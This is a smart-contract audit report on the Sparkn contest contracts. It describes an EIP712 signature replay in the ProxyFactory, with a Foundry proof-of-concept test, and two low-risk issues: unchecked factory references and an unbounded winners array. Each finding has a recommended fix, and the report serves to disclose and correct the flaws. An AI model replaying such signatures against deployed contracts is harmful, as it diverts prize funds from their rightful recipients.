# Sparkn  - Findings Report

# Table of contents
- ## [Contest Summary](#contest-summary)
- ## [Results Summary](#results-summary)
- ## High Risk Findings
    - ### [H-01. ProxyFactory does not prevent EIP712 replay attacks ](#H-01)

- ## Low Risk Findings
    - ### [L-01. No validation if implementation contract hold reference to the valid factory address.](#L-01)
    - ### [L-02. No limit in winners array could lead to DoS](#L-02)


# <a id='contest-summary'></a>Contest Summary

### Sponsor: CodeFox Inc.

### Dates: Aug 21st, 2023 - Aug 29th, 2023

[See more contest details here](https://www.codehawks.com/contests/cllcnja1h0001lc08z7w0orxx)

# <a id='results-summary'></a>Results Summary

### Number of findings:
   - High: 1
   - Medium: 0
   - Low: 2


# High Risk Findings

## <a id='H-01'></a>H-01. ProxyFactory does not prevent EIP712 replay attacks             

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-08-sparkn/blob/0f139b2dc53905700dd29a01451b330f829653e9/src/ProxyFactory.sol#L152-L164

## Summary
The contract is using OZ EIP712 implementation and it prevents from cross-chain replay attacks, but not from executing ones transaction a couple of times on the same contract implementation.

## Vulnerability Details
[EIP712](https://eips.ethereum.org/EIPS/eip-712) only defines the structure which should be used, so signed messages are represented in better way, but does not define how to prevent replay attacks. Good practices for using signature for given function is to hash all important params, include deadline for which the signature is valid and some check whether transaction with same signature is entering the contract. In this contract none of the above is implemented:
```
 function deployProxyAndDistributeBySignature(
        address organizer,
        bytes32 contestId,
        address implementation,
        bytes calldata signature,
        bytes calldata data
    ) public returns (address) {
        bytes32 digest = _hashTypedDataV4(
            keccak256(abi.encode(contestId, data))
        );
        if (ECDSA.recover(digest, signature) != organizer)
            revert ProxyFactory__InvalidSignature();
        bytes32 salt = _calculateSalt(organizer, contestId, implementation);
        if (saltToCloseTime[salt] == 0)
            revert ProxyFactory__ContestIsNotRegistered();
        if (saltToCloseTime[salt] > block.timestamp)
            revert ProxyFactory__ContestIsNotClosed();
        address proxy = _deployProxy(organizer, contestId, implementation);
        _distribute(proxy, data);
        return proxy;
    }
```
You could see this [article](https://dacian.me/signature-replay-attacks). Here are described above-mentioned security concerns.

## Impact
Replay attacks could have different impacts in different and generally they are entry points for bigger exploits.
Here an example could be as follows: 

We have contest A with participants x,y,Eve with percentages 20,20,60
1. Bob is the organizer of the contract, but he sign the above data(winners[x,y,Eve], percentages[20,20,60]) and send the signature to his friend Alice to end end the contest, when it is time, because Bob has a lot to do.
2. The only think which is checked within the signature is the data and the contestId. (We don't check the implementation which is important part for the execution).
3. Alice executes function deployProxyAndDistributeBySignature() with the corresponding params for the organizer(Bob), data, implementation of the existing contest and corresponding id.
4. The prices are distributed and everybody is happy, but Eve the winner of the 60% of the price pool saw that he could use the same signature again for those organizer.
5 - First scenario is if somebody accidently sent assets to already finalized contest, Eve could execute deployProxyAndDistributeBySignature() and take more assets.
5 -  Another scenario is that the same organizer creates new contest, but with other implementation. The unique salt, which we use to track if the contest exist hashes (organizer, contestId, implementation), so the same values for the first two params and different implementation is a valid empty slot, where the contest could be initialized.
6. Now Eve could get credit without even taking part of the contest. When the contest ends, she just have to call deployProxyAndDistributeBySignature() with the same data as the signature is set, but as long as we don't hash the implementation in the struct, she can pass the new contest implementation and so guess... The prices for the new contest are distributed to people, which never took part.

## PoC - Test
```
      function testIfConstestWithNewImplementationAndSameOrganizerAndIdCouldBeExploitedByOldSignature() public setUpContestForJasonAndSentJpycv2Token(TEST_SIGNER) {
        // before
        assertEq(MockERC20(jpycv2Address).balanceOf(user1), 0 ether);
        assertEq(MockERC20(jpycv2Address).balanceOf(stadiumAddress), 0 ether);

        (bytes32 digest, bytes memory sendingData, bytes memory signature) = createSignatureByASigner(TEST_SIGNER_KEY);
        assertEq(ECDSA.recover(digest, signature), TEST_SIGNER);

        bytes32 randomId = keccak256(abi.encode("Jason", "001"));
        vm.warp(8.01 days);
        // it succeeds
        proxyFactory.deployProxyAndDistributeBySignature(
            TEST_SIGNER, randomId, address(distributor), signature, sendingData
        );

        // Setup new implementation + new contest.
        vm.startBroadcast();
        Distributor newImple = new Distributor(address(proxyFactory), stadiumAddress);
        vm.stopBroadcast();
        vm.startPrank(factoryAdmin);
        proxyFactory.setContest(TEST_SIGNER, randomId, block.timestamp + 8 days, address(newImple));
        vm.stopPrank();
        bytes32 salt = keccak256(abi.encode(TEST_SIGNER, randomId, address(newImple)));
        address proxyAddress = proxyFactory.getProxyAddress(salt, address(newImple));
        vm.startPrank(sponsor);
        MockERC20(jpycv2Address).transfer(proxyAddress, 10 ether);
        vm.stopPrank();

        vm.warp(20 days);

        // This is totally different contest from the previous one, using different implementation, but winners are the same,
        // because the sig with provided data from the previous contest is valid.
       proxyFactory.deployProxyAndDistributeBySignature(
            TEST_SIGNER, randomId, address(newImple), signature, sendingData
        );

        // The test is passing, because all operations has passed and the tx wasn't reverted, which is wrong behaviour of the contract
        // because fail_on_revert = true and this is why if the transaction is reverted, this test would fail.
    }
```
## Tools Used
Manual review

## Recommendations
Consider implementing nonces, deadline and hashing all important parametes as "implementation".
You could see [OZ ERC20Permit implementation](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/extensions/ERC20Permit.sol)

```
    mapping(address => uint256) nonces;

    function deployProxyAndDistributeBySignature(
        address organizer,
        bytes32 contestId,
        address implementation,
        uint256 deadline,
        bytes calldata signature,
        bytes calldata data
    ) public returns (address) {
        if (block.timestamp > deadline) {
            revert("Signature has expired");
        }

        bytes32 digest = _hashTypedDataV4(
            keccak256(
                abi.encode(
                    contestId,
                    data,
                    implementation,
                    deadline,
                    _useNonce(organizer)
                )
            )
        );
        if (ECDSA.recover(digest, signature) != organizer)
            revert ProxyFactory__InvalidSignature();
        bytes32 salt = _calculateSalt(organizer, contestId, implementation);
        if (saltToCloseTime[salt] == 0)
            revert ProxyFactory__ContestIsNotRegistered();
        if (saltToCloseTime[salt] > block.timestamp)
            revert ProxyFactory__ContestIsNotClosed();
        address proxy = _deployProxy(organizer, contestId, implementation);
        _distribute(proxy, data);
        return proxy;
    }

    function _useNonce(address owner) private returns (uint256) {
        uint256 result = nonces[owner];
        nonces[owner]++;
        return result;
    }
```
		


# Low Risk Findings

## <a id='L-01'></a>L-01. No validation if implementation contract hold reference to the valid factory address.            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-08-sparkn/blob/0f139b2dc53905700dd29a01451b330f829653e9/src/ProxyFactory.sol#L105-L115

## Summary
In the contract creation function there is check if the passed implementation is address(0), but there isn't check if the implementation is a valid (not vulnerable) contract.
In the current architecture all implementations are dependant on the factory contract and especially the whitelistedTokens inside it, but we never check if the implementation address, with which we initialize the contest references the valid factory contract. 
## Vulnerability Details
This could lead to lost funds, if malicious implementation is being passed, or locked funds if wrong address is passed by mistake. 
## Impact
1. Imagine having the same factory contract, but initialized from Eve, but inside withlisted array, there are vulnerable and strange contracts. 
2. Eve also creates an implementation, which looks just as the original one, except that the factory address is the one with the vulnerable whitelist.
3. Now if by any mistake the owner of the original factory pass implementation, which points to different factory contract, there won't be warning and the new contest will start. 
4. Sponsors send funds to the new proxy and the period ends and it is time to distribute the prizes.
5. The prizes are locked forever, because of the check:
```
function distribute(address token, address[] memory winners, uint256[] memory percentages, bytes memory data)
        external
    {
        if (msg.sender != FACTORY_ADDRESS) {
            revert Distributor__OnlyFactoryAddressIsAllowed();
        }
        _distribute(token, winners, percentages, data);
    }
```

There could also be different scenarios, if there is other valid implementation, which won't revert, but distribute tokens to the hacker, or DoS in some other way.
## Tools Used
Manual Review
## Recommendations
Consider making an interface for all implementations, which should contain `function getFactoryAddress()` method and then use it in the factory on contest creation to validate if the passed implementation address points to the current factory.
This may also be prevented by vulnerable implementation, but then the code won't be identical to a valid implementation.
Checking the creator of the implementation if it a trusted owner could also prevent wrong implementations.
## <a id='L-02'></a>L-02. No limit in winners array could lead to DoS            

### Relevant GitHub Links
	
https://github.com/Cyfrin/2023-08-sparkn/blob/0f139b2dc53905700dd29a01451b330f829653e9/src/Distributor.sol#L128

https://github.com/Cyfrin/2023-08-sparkn/blob/0f139b2dc53905700dd29a01451b330f829653e9/src/Distributor.sol#L145

## Summary
In Distributor contract we iterate over the array of the winners two times (first time over the percentage array to check if the percentages are correctly distributed). If we check this, then we consider the system to be less reliable to the off-chain actors provided data. This is why providing limit for winners array is essential for having a reliable system.
## Vulnerability Details
Having 5 winners, which is considered normal and acceptable scales to 150 000 gas. We can think as 30 000 gas per winner. Currently we don't have check, so very big number of winners could lead to too high gas prices to distribute the prizes and so DoS the contest.
## Impact
DoS the contest if a large number of winners are passed.
## Tools Used
Manual Review
## Recommendations
Implement max number of winners on each distributor implementation.


